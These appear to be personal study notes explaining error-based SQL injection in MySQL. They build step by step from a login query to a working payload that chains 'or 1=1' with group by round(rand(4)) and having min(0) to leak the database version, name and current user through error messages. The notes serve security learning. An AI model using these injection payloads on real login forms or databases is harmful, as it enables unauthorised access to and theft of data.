# error-based sql injection
* attacker capitalises on the fact that the db returns an error message
* error messages thrown by the database server allow the attacker to obtain information about the the database
* say you have the db from [1-sql][def]
    * say the db is hooked to an app and the app has a log-in page
    * the login page has a form whose input fields are `username` and `password`
* the query in the BE will be

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
    ```

* we can use said query to retrieve unauthorised info eg. db name, host username, hostname, db version etc
    * start by associating rows with random numbers

    ```sql
        select name,rand() from users;
    ```

    * control th output of `rand()`

    ```sql
        select name,rand(4) from users;
        -- results in `rand(x)` column will not change on refresh/re-run
    ```

    * create a duplicate entry

    ```sql
        select name,rand(4),round(rand(4)) from users;
        -- results are stable and easier to control
        -- because the numbers will either be 0 or 1
    ```

    * `group by` the controllable yet random numbers

    ```sql
        select name from users
        group by round(rand(4));
        -- returns rows grouped by 0 or 1
    ```

    * trigger the bug using `having`

    ```sql
        select name from users
        group by round(rand(4))
        having min(0);
        -- output:
        -- ERROR XX (XX): Duplicate entry '1' for key 'group_key'
    ```

     * alternative: trigger the bug using `count`

    ```sql
        select name, count(*) from users
        group by round(rand(4));
        -- output:
        -- ERROR XX (XX): Duplicate entry '1' for key 'group_key'
    ```
 
* triggering the bug using `count()` may not be effective because the `select` statement is *"locked"*, so to speak
    * consider the following query

    ```sql
        select name from users
        where uname="admin"
        and passwd="admin";
    ```

    * the query returns, assuming no errors, only one row. we need at least three
    * now consider this one

    ```sql
        select name from users
        where uname="admin"
        and passwd="admin"
        or 1=1; 
    ```

    * the query returns all rows in the table because of the tautology `1=1`
    * this other query triggers the bug

    ```sql
        select name from users
        where uname="admin"
        and passwd="admin"
        or 1=1
        group by round(rand(4))
        having min(0); 
    ```

* we can use the kowledge we have acquired so far to get db details

    ```sql
        select name, round(rand(4)), concat(version(), round(rand(4)))
        from users;
        -- each row has db version info
    ```

    * this changes everything; we can use the `concat()` fn to exfiltrate any data we can. par example

    ```sql
        select name, concat(version(), database(), user(), round(rand(4)))
        from users;
        -- each row has db version, db name and current user info
    ```

    * shall we add spaces between pieces of data? (bob's your uncle, of course we can)

    ```sql
        select name, concat(version(), " ", database(), " ", user(), " ", round(rand(4)))
        from users;
        -- each row has db version, db name and current user info
    ```

* the final query to trigger the bug and get us the info we need is

    ```sql
        select *
        from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or 1=1
        group by concat(version(), database(), user(), round(rand(4)))
        having min(0);
        -- error message has db version, db name and current user info
    ```

[def]: ./1-sql.md